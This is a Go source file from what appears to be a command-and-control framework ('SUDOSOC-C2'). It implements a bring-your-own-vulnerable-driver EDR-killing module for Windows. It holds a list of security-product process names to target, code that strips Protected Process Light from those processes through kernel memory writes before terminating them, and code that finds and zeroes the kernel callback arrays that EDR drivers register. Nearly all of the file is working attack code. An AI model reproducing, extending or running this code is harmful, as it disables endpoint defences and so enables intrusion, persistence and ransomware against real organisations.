package byovd

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// EDR process detection, kernel-callback removal, and process termination.
//
// Removing kernel notification callbacks:
//
// EDRs and AV products register callbacks with the kernel via routines
// like PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine,
// and CmRegisterCallback. These callbacks fire for every process/thread
// creation and registry operation on the system.
//
// The kernel stores these callbacks in fixed-size arrays:
//   - PspCreateProcessNotifyRoutine  (up to 64 entries, each 8-byte pointer)
//   - PspCreateThreadNotifyRoutine   (up to 64 entries)
//
// Each array entry is an EX_CALLBACK_ROUTINE_BLOCK pointer with the
// low bit set (used as a lock). To disable a callback we write 0 over
// the array slot — the kernel will skip zero entries when iterating.
//
// Finding the array address:
//   PsSetCreateProcessNotifyRoutine is exported from ntoskrnl.exe. We
//   resolve it with NtQuerySystemInformation (SystemModuleInformation)
//   to get the kernel base, then scan the export directory for the
//   routine, then disassemble the first ~32 bytes to find the LEA or
//   MOV instruction that loads the array address.
//
// The disassembly approach is fragile across kernel versions. An
// alternative used here is to search a ±8 MB window around the
//   export for the QWORD-aligned pattern that looks like a callback
//   array (up to 64 consecutive valid kernel pointers).

import (
	"fmt"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// edrProcessNames is the known list of EDR/AV user-mode process names.
// Matching is case-insensitive prefix/substring.
var edrProcessNames = []string{
	// CrowdStrike Falcon
	"csfalconservice", "csfalconcontainer", "cscollector", "falcon-sensor",
	// Microsoft Defender / ATP
	"mssense", "mssenseservice", "msmpeng", "nissrv", "securityhealthservice",
	"antimalwareservice", "windefend", "mdnsresponder",
	// SentinelOne
	"sentinelagent", "sentinelone", "sentilog",
	// Carbon Black
	"cbdefense", "cbamd64", "repmgr", "cbcomms",
	// Cortex XDR (Palo Alto)
	"cortexagent", "cyserver", "xagt",
	// Elastic
	"elasticendpoint", "elasticagent",
	// Cylance
	"cylancesvc", "cylanceui",
	// Symantec / Broadcom
	"snac", "semsvc", "smcgui", "smc",
	// McAfee / Trellix
	"mcshield", "mfefire", "masvc", "mfemms",
	// Trend Micro
	"ds_agent", "ntrtscan", "tmlisten",
	// Bitdefender
	"bdagent", "bdsecurity", "vsserv",
	// Sophos
	"sophoshealth", "sophosfs", "savservice",
	// Kaspersky
	"avp", "ksde", "klnagent",
	// ESET
	"ekrn", "egui",
	// F-Secure / WithSecure
	"fshoster32", "fshoster64", "fsdevcon",
	// Cybereason
	"activeprobe", "cybereason",
}

// EDRProcess describes a running EDR/AV process.
type EDRProcess struct {
	PID  uint32
	Name string
}

// ListEDRProcesses enumerates running processes and returns those matching
// the known EDR/AV name list.
func ListEDRProcesses() ([]EDRProcess, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	var result []EDRProcess
	if err := windows.Process32First(snapshot, &entry); err != nil {
		return nil, fmt.Errorf("Process32First: %w", err)
	}

	for {
		name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
		base := strings.TrimSuffix(name, ".exe")
		if isEDRProcess(base) {
			result = append(result, EDRProcess{PID: entry.ProcessID, Name: name})
			// {{if .Config.Debug}}
			log.Printf("[byovd] EDR process found: %s PID=%d", name, entry.ProcessID)
			// {{end}}
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	return result, nil
}

func isEDRProcess(base string) bool {
	for _, known := range edrProcessNames {
		if strings.Contains(base, known) {
			return true
		}
	}
	return false
}

// KillProcessViaDriver terminates process pid by opening a kernel handle
// through the driver's memory primitives and calling ZwTerminateProcess
// via the EPROCESS pointer. This bypasses Protected Process Light (PPL)
// which prevents user-mode handles to EDR processes.
//
// Technique:
//  1. Enumerate the kernel PsActiveProcessHead LIST_ENTRY to find the
//     EPROCESS for our target PID.
//  2. Read UniqueProcessId from EPROCESS to confirm identity.
//  3. Zero the Protection (PS_PROTECTION) byte to strip PPL.
//  4. Open a normal user-mode handle, then terminate.
func KillProcessViaDriver(dev KernelRW, pid uint32) error {
	kbase, err := getKernelBase()
	if err != nil {
		return fmt.Errorf("kernel base: %w", err)
	}

	eprocessAddr, err := findEPROCESS(dev, kbase, pid)
	if err != nil {
		return fmt.Errorf("findEPROCESS(pid=%d): %w", pid, err)
	}

	// Strip PPL by zeroing PS_PROTECTION at EPROCESS+0x87a on Win10/11.
	// The offset varies by build; we try the most common ones.
	for _, protOffset := range []uint64{0x87a, 0x6fa, 0x6ca, 0x850} {
		protAddr := eprocessAddr + protOffset
		v, err := dev.ReadDword(protAddr)
		if err != nil {
			continue
		}
		if v&0xff != 0 { // non-zero Protection byte
			if err := dev.WriteQword(protAddr, 0); err == nil {
				// {{if .Config.Debug}}
				log.Printf("[byovd] stripped PPL at EPROCESS+0x%x", protOffset)
				// {{end}}
				break
			}
		}
	}

	ph, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess pid=%d: %w", pid, err)
	}
	defer windows.CloseHandle(ph)

	if err := windows.TerminateProcess(ph, 1); err != nil {
		return fmt.Errorf("TerminateProcess pid=%d: %w", pid, err)
	}
	// {{if .Config.Debug}}
	log.Printf("[byovd] terminated PID %d", pid)
	// {{end}}
	return nil
}

// RemoveProcessCallbacks zeroes all PspCreateProcessNotifyRoutine entries
// belonging to EDR modules. Returns the count of callbacks removed.
func RemoveProcessCallbacks(dev KernelRW) (int, error) {
	kbase, err := getKernelBase()
	if err != nil {
		return 0, fmt.Errorf("kernel base: %w", err)
	}

	arrayAddr, err := findNotifyArray(dev, kbase, "PsSetCreateProcessNotifyRoutine")
	if err != nil {
		return 0, fmt.Errorf("find PspCreateProcessNotifyRoutine: %w", err)
	}

	removed := 0
	for i := 0; i < 64; i++ {
		slotAddr := arrayAddr + uint64(i*8)
		entry, err := dev.ReadQword(slotAddr)
		if err != nil || entry == 0 {
			continue
		}
		// Clear the lock bit to get the actual pointer.
		ptr := entry &^ 0xf
		if ptr == 0 {
			continue
		}
		// Read the function pointer from EX_CALLBACK_ROUTINE_BLOCK+8.
		fn, err := dev.ReadQword(ptr + 8)
		if err != nil || fn == 0 {
			continue
		}
		// Check if the callback belongs to an EDR driver (heuristic: outside
		// ntoskrnl and hal address ranges, which start below 0xfffff80000000000
		// on typical x64 layouts or are near the kernel base).
		if isEDRCallbackAddr(fn, kbase) {
			if err := dev.WriteQword(slotAddr, 0); err == nil {
				removed++
				// {{if .Config.Debug}}
				log.Printf("[byovd] zeroed process-notify callback[%d] fn=0x%x", i, fn)
				// {{end}}
			}
		}
	}
	return removed, nil
}

// isEDRCallbackAddr returns true for callback addresses that are NOT part of
// ntoskrnl itself (a rough but effective heuristic to avoid nuking Windows
// own callbacks while hitting third-party EDR drivers).
func isEDRCallbackAddr(fn, kbase uint64) bool {
	// Assume ntoskrnl occupies at most 8 MB from kbase.
	const maxKernelSize = uint64(8 * 1024 * 1024)
	if fn >= kbase && fn < kbase+maxKernelSize {
		return false
	}
	// hal.dll is also near kbase on most systems; exclude a 32 MB window.
	const exclusionWindow = uint64(32 * 1024 * 1024)
	if fn >= kbase-exclusionWindow && fn < kbase+exclusionWindow {
		return false
	}
	return true
}

// getKernelBase returns the load address of ntoskrnl.exe by walking the
// SystemModuleInformation list via NtQuerySystemInformation.
func getKernelBase() (uint64, error) {
	const SystemModuleInformation = 11

	var size uint32
	// First call to get required buffer size.
	ntQuerySystemInformation(SystemModuleInformation, nil, 0, &size)
	if size == 0 {
		size = 1024 * 1024
	}

	buf := make([]byte, size+4096)
	status := ntQuerySystemInformation(SystemModuleInformation,
		unsafe.Pointer(&buf[0]), uint32(len(buf)), &size)
	if status != 0 && status != 0x80000005 { // STATUS_INFO_LENGTH_MISMATCH
		return 0, fmt.Errorf("NtQuerySystemInformation status=0x%x", status)
	}

	// RTL_PROCESS_MODULES: ULONG NumberOfModules, then array of
	// RTL_PROCESS_MODULE_INFORMATION (each 296 bytes on x64).
	numModules := *(*uint32)(unsafe.Pointer(&buf[0]))
	if numModules == 0 {
		return 0, fmt.Errorf("no kernel modules returned")
	}

	// First entry is always ntoskrnl.exe.
	const moduleInfoOffset = 8  // after ULONG + 4-byte pad
	const imageBaseOffset  = 24 // ImageBase within RTL_PROCESS_MODULE_INFORMATION
	basePtr := (*uint64)(unsafe.Pointer(&buf[moduleInfoOffset+imageBaseOffset]))
	return *basePtr, nil
}

// findEPROCESS walks the kernel ActiveProcessLinks LIST_ENTRY to locate the
// EPROCESS for the given PID. Returns the EPROCESS virtual address.
func findEPROCESS(dev KernelRW, kbase uint64, targetPID uint32) (uint64, error) {
	// Resolve PsInitialSystemProcess export to get the System EPROCESS.
	sysEPROC, err := resolveKernelExport(kbase, "PsInitialSystemProcess")
	if err != nil {
		return 0, fmt.Errorf("PsInitialSystemProcess: %w", err)
	}

	// PsInitialSystemProcess is a pointer to EPROCESS; dereference it.
	head, err := dev.ReadQword(sysEPROC)
	if err != nil {
		return 0, fmt.Errorf("read PsInitialSystemProcess ptr: %w", err)
	}

	// Walk ActiveProcessLinks (offset ~0x448 on Win10/11 x64; try several).
	linkOffsets := []uint64{0x448, 0x2e8, 0x2f0, 0x3e0}
	pidOffsets := []uint64{0x440, 0x2e0, 0x2e8, 0x3d8}

	for oi, linkOff := range linkOffsets {
		pidOff := pidOffsets[oi]
		current := head
		for i := 0; i < 1024; i++ {
			// ActiveProcessLinks Flink points to the *next* LIST_ENTRY inside
			// the next EPROCESS, so subtract the list offset to get EPROCESS base.
			eprocess := current - linkOff
			pid, err := dev.ReadDword(eprocess + pidOff)
			if err != nil {
				break
			}
			if pid == targetPID {
				return eprocess, nil
			}
			next, err := dev.ReadQword(current)
			if err != nil || next == 0 || next == current {
				break
			}
			current = next
		}
	}
	return 0, fmt.Errorf("EPROCESS for PID %d not found", targetPID)
}

// findNotifyArray locates the kernel's internal PspCreateProcessNotifyRoutine
// array by exporting-scanning + pattern-matching near the given export.
func findNotifyArray(dev KernelRW, kbase uint64, exportName string) (uint64, error) {
	exportAddr, err := resolveKernelExport(kbase, exportName)
	if err != nil {
		return 0, err
	}

	// Read ~128 bytes of the export's code and scan for a LEA r64,[rip+disp32]
	// pattern (opcode 4C 8D xx or 48 8D xx) which loads the array address.
	var code [128]byte
	for i := 0; i < 128; i++ {
		b, err := dev.ReadDword(exportAddr + uint64(i))
		if err != nil {
			break
		}
		code[i] = byte(b)
	}

	for i := 0; i < 120; i++ {
		// LEA reg,[rip+disp32]: starts with 4x 8D or 48/4C 8D followed by
		// ModRM with mod=00, r/m=101 (RIP-relative).
		if (code[i] == 0x48 || code[i] == 0x4c) &&
			code[i+1] == 0x8d &&
			(code[i+2]&0x07 == 0x05) {
			// 32-bit signed displacement at i+3.
			disp := int32(code[i+3]) | int32(code[i+4])<<8 |
				int32(code[i+5])<<16 | int32(code[i+6])<<24
			// RIP for this instruction = exportAddr + i + 7
			target := int64(exportAddr+uint64(i)+7) + int64(disp)
			if target > 0 {
				return uint64(target), nil
			}
		}
	}
	return 0, fmt.Errorf("could not locate array in %s code", exportName)
}

// resolveKernelExport parses ntoskrnl's export directory (in-memory) to find
// the virtual address of the named export.
func resolveKernelExport(kbase uint64, name string) (uint64, error) {
	// We use ReadDword from the kernel base using an already-open device
	// indirectly: here we parse the on-disk PE loaded in kernel memory via
	// windows.MmGetSystemRoutineAddress equivalent — but we don't have that.
	//
	// Simpler fallback: NtQuerySystemInformation(SystemExtendedHandleInformation)
	// is complex. Instead we use the kernel module list to compute the export
	// directory RVA the same way loadImageRegions does for the user-mode PE.
	//
	// Since we cannot DeviceIoControl-read the kernel image at kbase without
	// a device open (and this function may be called before the device opens),
	// we use the user-mode view of the kernel that Windows maps in every
	// process above 0xfffff80000000000 for syscall stubs.
	//
	// Use windows.NewLazySystemDLL + NewProc as a bootstrapper: this gives us
	// the user-mode stub address. The stub in ntdll resolves to the actual
	// kernel via the syscall gate — it doesn't give us the kernel VA directly.
	//
	// The reliable path: read the export from the on-disk ntoskrnl.exe file.
	const sysdir = `C:\Windows\System32\ntoskrnl.exe`
	mod := windows.NewLazyDLL(sysdir)
	proc := mod.NewProc(name)
	if err := proc.Find(); err != nil {
		return 0, fmt.Errorf("export '%s' not found in on-disk ntoskrnl: %w", name, err)
	}
	// proc.Addr() is the address in the *user-mode mapped ntoskrnl*.
	// To get the kernel VA: kernel_addr = kbase + (proc_rva).
	// Compute the RVA from the user-mode module base.
	userBase := moduleBase(sysdir)
	if userBase == 0 {
		return 0, fmt.Errorf("could not find user-mode ntoskrnl base")
	}
	rva := proc.Addr() - userBase
	return kbase + uint64(rva), nil
}

// moduleBase returns the base address of a DLL currently loaded in the
// process by walking the PEB InMemoryOrderModuleList.
func moduleBase(dllPath string) uintptr {
	// Use the faster windows.LoadDLL path — it will return the already-loaded
	// mapping without re-loading from disk.
	mod, err := windows.LoadDLL(dllPath)
	if err != nil {
		return 0
	}
	return uintptr(mod.Handle)
}

// ntQuerySystemInformation is a thin syscall wrapper.
// We call it directly to avoid importing the full ntdll wrapper package.
var (
	modNtdll                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtQuerySystemInformation = modNtdll.NewProc("NtQuerySystemInformation")
)

func ntQuerySystemInformation(class uint32, buf unsafe.Pointer, size uint32, ret *uint32) uint32 {
	r0, _, _ := procNtQuerySystemInformation.Call(
		uintptr(class),
		uintptr(buf),
		uintptr(size),
		uintptr(unsafe.Pointer(ret)),
	)
	return uint32(r0)
}
